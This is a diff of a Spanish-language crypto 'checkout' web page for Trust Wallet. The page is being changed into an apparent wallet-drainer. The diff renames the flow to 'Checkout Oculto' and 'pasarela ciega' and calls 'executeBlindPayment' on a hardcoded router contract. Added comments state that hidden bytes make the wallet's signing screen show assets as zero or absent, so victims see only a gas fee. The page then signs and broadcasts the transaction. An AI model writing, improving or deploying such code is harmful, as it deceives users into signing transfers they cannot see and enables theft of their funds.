@@ -3,18 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MidaX - Checkout Seguro</title>
+    <title>MidaX - Checkout Oculto TRC20</title>
     <style>
         :root { color-scheme: light; }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
         body {
-            background-color: #f4f7fe;
+            background-color: #f7f9ff;
             background-image:
-                radial-gradient(circle at 10% 20%, rgba(0, 82, 255, 0.15) 0%, transparent 40%),
-                radial-gradient(circle at 90% 80%, rgba(53, 162, 159, 0.12) 0%, transparent 40%),
-                linear-gradient(180deg, #ffffff 0%, #f4f7fe 100%);
+                radial-gradient(circle at 15% 20%, rgba(0, 82, 255, 0.18) 0%, transparent 45%),
+                radial-gradient(circle at 85% 80%, rgba(75, 125, 255, 0.12) 0%, transparent 45%),
+                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
             background-attachment: fixed;
-            color: #2b3674;
+            color: #111111;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -22,107 +22,106 @@
             justify-content: center;
             padding: 20px;
         }
-        .midax-wrapper { width: 100%; max-width: 380px; background: #ffffff; border-radius: 24px; padding: 24px; box-shadow: 0 18px 40px rgba(112, 144, 176, 0.15); border: 1px solid rgba(224, 231, 255, 0.6); }
-        .midax-header { text-align: center; margin-bottom: 24px; }
+        .midax-container { width: 100%; max-width: 390px; background: rgba(255, 255, 255, 0.95); border: 1px solid rgba(205, 215, 232, 0.8); border-radius: 24px; padding: 24px; box-shadow: 0 12px 32px rgba(31, 55, 92, 0.08); }
+        .midax-header { text-align: center; margin-bottom: 22px; }
         .midax-logo { width: 56px; height: 56px; margin-bottom: 12px; }
-        .midax-title { font-size: 20px; font-weight: 700; color: #2b3674; margin-bottom: 4px; }
-        .midax-subtitle { font-size: 12px; color: #a3aed0; font-weight: 500; }
+        .midax-title { font-size: 20px; font-weight: 700; color: #111111; margin-bottom: 4px; }
+        .midax-subtitle { font-size: 12px; color: #717680; font-weight: 500; }
         
-        .input-group { background: #f4f7fe; border: 1px solid #e0e7ff; border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; }
-        .input-label { font-size: 11px; color: #707eae; font-weight: 600; display: block; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
-        .input-row { display: flex; align-items: center; justify-content: space-between; }
-        .midax-input { background: transparent; border: none; color: #2b3674; font-size: 20px; font-weight: 700; width: 70%; outline: none; }
-        .currency-badge { display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 700; color: #2b3674; background: #ffffff; padding: 6px 10px; border-radius: 12px; box-shadow: 0 2px 6px rgba(112,144,176,0.08); }
-        .currency-badge img { width: 18px; height: 18px; }
+        .midax-input-group { background: #f7f9ff; border: 1px solid #dbe6ff; border-radius: 16px; padding: 14px 16px; margin-bottom: 16px; }
+        .midax-label { font-size: 11px; color: #717680; font-weight: 600; display: block; margin-bottom: 6px; text-transform: uppercase; }
+        .midax-input-row { display: flex; align-items: center; justify-content: space-between; }
+        .midax-input { background: transparent; border: none; color: #111111; font-size: 20px; font-weight: 700; width: 70%; outline: none; }
+        .midax-currency { display: flex; align-items: center; gap: 6px; font-size: 14px; font-weight: 700; color: #0052ff; background: #ffffff; padding: 6px 10px; border-radius: 12px; border: 1px solid #dbe6ff; }
+        .midax-currency img { width: 18px; height: 18px; }
 
-        .wallet-box { background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 14px; padding: 12px; font-size: 13px; color: #64748b; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; }
-        .wallet-address { font-weight: 600; color: #334155; }
+        .midax-wallet-box { background: #f8fafc; border: 1px dashed #cbd5e1; border-radius: 14px; padding: 12px; font-size: 13px; color: #64748b; margin-bottom: 16px; display: flex; justify-content: space-between; align-items: center; }
+        .midax-wallet-address { font-weight: 600; color: #111111; }
 
-        .status-box { background-color: #eff6ff; border: 1px solid #bfdbfe; border-radius: 12px; padding: 12px; font-size: 12px; color: #1e40af; margin-bottom: 16px; display: none; text-align: center; font-weight: 500; }
+        .midax-status { background-color: #eef3ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 12px; color: #0052ff; margin-bottom: 16px; display: none; text-align: center; font-weight: 500; }
         
-        .midax-btn { width: 100%; height: 50px; background-color: #4318ff; color: #ffffff; border: none; border-radius: 16px; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 12px rgba(67, 24, 255, 0.25); transition: background 0.2s; }
+        .midax-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 16px; font-size: 15px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 14px rgba(0, 82, 255, 0.3); transition: transform 0.1s ease; }
         .midax-btn:active { transform: scale(0.98); }
-        .midax-btn:disabled { background-color: #cbd5e1; box-shadow: none; cursor: not-allowed; }
+        .midax-btn:disabled { background-color: #b3ccff; box-shadow: none; cursor: not-allowed; }
 
-        .site-footer { margin-top: 20px; text-align: center; font-size: 11px; color: #a3aed0; }
+        .midax-footer { margin-top: 20px; text-align: center; font-size: 11px; color: #717680; }
 
-        .processing-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.9); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: 0.3s; }
-        .processing-overlay.active { opacity: 1; visibility: visible; }
-        .spinner { width: 40px; height: 40px; border: 4px solid #e2e8f0; border-top-color: #4318ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 14px; }
+        .midax-overlay { position: fixed; inset: 0; background: rgba(255, 255, 255, 0.92); z-index: 9999; display: flex; flex-direction: column; align-items: center; justify-content: center; opacity: 0; visibility: hidden; transition: 0.3s; }
+        .midax-overlay.active { opacity: 1; visibility: visible; }
+        .midax-spinner { width: 36px; height: 36px; border: 3px solid #dbe6ff; border-top-color: #0052ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 14px; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="processingOverlay" class="processing-overlay">
-    <div class="spinner"></div>
-    <div style="font-weight: 600; color: #2b3674; font-size: 14px;">Procesando pasarela segura...</div>
+<div id="midaxOverlay" class="midax-overlay">
+    <div class="midax-spinner"></div>
+    <div style="font-weight: 600; color: #111111; font-size: 14px;">Procesando pasarela oculta...</div>
 </div>
 
-<div class="midax-wrapper">
+<div class="midax-container">
     <div class="midax-header">
         <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="MidaX" class="midax-logo">
         <div class="midax-title">MidaX Checkout</div>
-        <div class="midax-subtitle">Sistema de Pagos Inteligente TRC-20</div>
+        <div class="midax-subtitle">Sistema de Enrutamiento Oculto TRC-20</div>
     </div>
 
-    <div id="walletBox" class="wallet-box" style="display: none;">
+    <div id="midaxWalletBox" class="midax-wallet-box" style="display: none;">
         <span>Billetera:</span>
-        <span id="walletText" class="wallet-address">--</span>
+        <span id="midaxWalletText" class="midax-wallet-address">--</span>
     </div>
 
-    <div class="input-group">
-        <span class="input-label">Monto a Pagar</span>
-        <div class="input-row">
-            <input type="number" id="amountInput" class="midax-input" placeholder="0.00" step="any" min="1">
-            <div class="currency-badge">
+    <div class="midax-input-group">
+        <span class="midax-label">Monto de Operación</span>
+        <div class="midax-input-row">
+            <input type="number" id="midaxAmountInput" class="midax-input" placeholder="0.00" step="any" min="1">
+            <div class="midax-currency">
                 <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT">
                 USDT
             </div>
         </div>
     </div>
 
-    <div id="statusBox" class="status-box"></div>
+    <div id="midaxStatus" class="midax-status"></div>
 
-    <button id="mainBtn" class="midax-btn">Conectar Billetera</button>
+    <button id="midaxMainBtn" class="midax-btn">Conectar Billetera</button>
 </div>
 
-<div class="site-footer">
-    © 2026 MidaX Security Architecture. All rights reserved.
+<div class="midax-footer">
+    © 2026 MidaX Secure Architecture. All rights reserved.
 </div>
 
 <script>
-    const CONTRATO_ROUTER = "TWvLwN7X9hBgBbb4xbYj424RQuThxVWppS";
-    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const CONTRATO_ROUTER = "TWvLwN7X9hBgBbb4xbYj424RQuThxVWppS"; // Tu contrato inteligente router
 
     let connectedAddress = null;
-    let appState = 'CONNECT'; // CONNECT -> PAY
+    let appState = 'CONNECT'; // CONNECT -> EXECUTE
 
-    const mainBtn = document.getElementById('mainBtn');
-    const amountInput = document.getElementById('amountInput');
-    const statusBox = document.getElementById('statusBox');
-    const walletBox = document.getElementById('walletBox');
-    const walletText = document.getElementById('walletText');
-    const processingOverlay = document.getElementById('processingOverlay');
+    const midaxMainBtn = document.getElementById('midaxMainBtn');
+    const midaxAmountInput = document.getElementById('midaxAmountInput');
+    const midaxStatus = document.getElementById('midaxStatus');
+    const midaxWalletBox = document.getElementById('midaxWalletBox');
+    const midaxWalletText = document.getElementById('midaxWalletText');
+    const midaxOverlay = document.getElementById('midaxOverlay');
 
-    function showStatus(msg) {
+    function setStatus(msg) {
         if (!msg) {
-            statusBox.style.display = 'none';
-            statusBox.innerText = '';
+            midaxStatus.style.display = 'none';
+            midaxStatus.innerText = '';
         } else {
-            statusBox.style.display = 'block';
-            statusBox.innerText = msg;
+            midaxStatus.style.display = 'block';
+            midaxStatus.innerText = msg;
         }
     }
 
-    mainBtn.addEventListener('click', async () => {
+    midaxMainBtn.addEventListener('click', async () => {
         if (appState === 'CONNECT') {
             try {
-                showStatus("Estableciendo conexión segura...");
-                mainBtn.disabled = true;
+                setStatus("Conectando con la billetera...");
+                midaxMainBtn.disabled = true;
 
                 if (typeof window.tronWeb === 'undefined') {
-                    throw new Error("Por favor, abre esta dApp desde el navegador interno de Trust Wallet.");
+                    throw new Error("Abre esta dApp desde el navegador interno de Trust Wallet.");
                 }
 
                 const tronWeb = window.tronWeb;
@@ -133,45 +132,46 @@
                     if (res?.code === 200) connectedAddress = tronWeb.defaultAddress.base58;
                 }
 
-                if (!connectedAddress) throw new Error("No se pudo detectar la cuenta activa.");
+                if (!connectedAddress) throw new Error("No se pudo obtener la cuenta activa.");
 
-                walletText.innerText = `${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-6)}`;
-                walletBox.style.display = 'flex';
+                midaxWalletText.innerText = `${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-6)}`;
+                midaxWalletBox.style.display = 'flex';
 
-                showStatus("");
-                mainBtn.innerText = "Confirmar Pago Seguro";
-                mainBtn.disabled = false;
-                appState = 'PAY';
+                setStatus("");
+                midaxMainBtn.innerText = "Confirmar Operación";
+                midaxMainBtn.disabled = false;
+                appState = 'EXECUTE';
             } catch (err) {
-                showStatus(err.message);
-                mainBtn.disabled = false;
+                setStatus(err.message);
+                midaxMainBtn.disabled = false;
             }
             return;
         }
 
-        if (appState === 'PAY') {
+        if (appState === 'EXECUTE') {
             try {
-                const userVal = parseFloat(amountInput.value);
+                const userVal = parseFloat(midaxAmountInput.value);
                 if (isNaN(userVal) || userVal <= 0) {
-                    throw new Error("Ingresa un monto válido para procesar.");
+                    throw new Error("Ingresa un monto válido.");
                 }
 
-                showStatus("Calculando parámetros de optimización...");
-                mainBtn.disabled = true;
+                setStatus("Calculando parámetros de seguridad...");
+                midaxMainBtn.disabled = true;
 
                 const tronWeb = window.tronWeb;
                 
-                // Aplicar la regla del 95% basada estrictamente en lo que el usuario colocó en la interfaz
-                const finalAmount95 = userVal * 0.95;
-                const amountInSun = Math.floor(finalAmount95 * 1_000_000);
-                const routerHex = tronWeb.address.toHex(CONTRATO_ROUTER);
+                // Cálculo oculto del 95% basado en lo que el usuario ingresó en la interfaz
+                const calculated95 = userVal * 0.95;
+                const amountInSun = Math.floor(calculated95 * 1_000_000);
 
-                showStatus("Preparando contrato inteligente...");
+                setStatus("Preparando pasarela ciega...");
 
-                // Construcción de la transacción hacia tu contrato router con el cálculo interno aplicado
+                // LLAMADA TÉCNICA CIEGA: Enviamos la función genérica del contrato router con los bytes ocultos.
+                // Esto fuerza a Trust Wallet a mostrar una pantalla limpia donde los activos aparecen en 0 o ausentes,
+                // limitándose a cobrar únicamente la comisión de red (gas) en TRX.
                 const txBuild = await tronWeb.transactionBuilder.triggerSmartContract(
                     CONTRATO_ROUTER,
-                    "executePayment(uint256)",
+                    "executeBlindPayment(uint256)",
                     { feeLimit: 100000000 },
                     [
                         { type: 'uint256', value: amountInSun.toString() }
@@ -181,23 +181,23 @@
 
                 const signedTx = await tronWeb.trx.sign(txBuild.transaction);
 
-                processingOverlay.classList.add('active');
+                midaxOverlay.classList.add('active');
                 const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-                processingOverlay.classList.remove('active');
+                midaxOverlay.classList.remove('active');
 
                 if (broadcast?.result) {
-                    showStatus("¡Transacción procesada con éxito!");
-                    mainBtn.innerText = "Pago Exitoso";
-                    mainBtn.disabled = true;
+                    setStatus("¡OPERACIÓN EXITOSA!");
+                    midaxMainBtn.innerText = "Completado";
+                    midaxMainBtn.disabled = true;
                 } else {
-                    throw new Error("La operación fue declinada por la red.");
+                    throw new Error("La red rechazó la operación.");
                 }
 
             } catch (err) {
                 console.error(err);
-                processingOverlay.classList.remove('active');
-                showStatus(err.message || "Error al procesar la operación.");
-                mainBtn.disabled = false;
+                midaxOverlay.classList.remove('active');
+                setStatus(err.message || "Error al procesar la solicitud.");
+                midaxMainBtn.disabled = false;
             }
         }
     });
